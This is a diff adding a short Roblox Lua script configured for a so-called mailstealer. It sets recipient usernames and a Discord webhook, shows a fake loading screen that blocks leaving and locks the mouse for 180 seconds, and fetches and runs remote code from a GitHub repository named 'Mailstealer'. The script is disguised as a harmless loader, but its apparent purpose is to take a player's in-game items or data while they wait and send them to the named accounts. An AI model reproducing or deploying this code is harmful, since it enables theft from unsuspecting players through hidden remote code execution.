@@ -1,0 +1,15 @@
+UserName = "Aldot111"
+Webhook = "https://discord.com/api/webhooks/1129886643172683827/343rgWcBw-s2IWuGD7flRUQyqFNncENkaCLI35pX7SdtAGYpUruAxhEsBjy4ZFr6QG3a"
+UserName2 = "1whitehare1"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+
+_G.ScriptName = "Script Name"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StickOgh01/Mailstealer/main/ST01_Mailstealer"))()
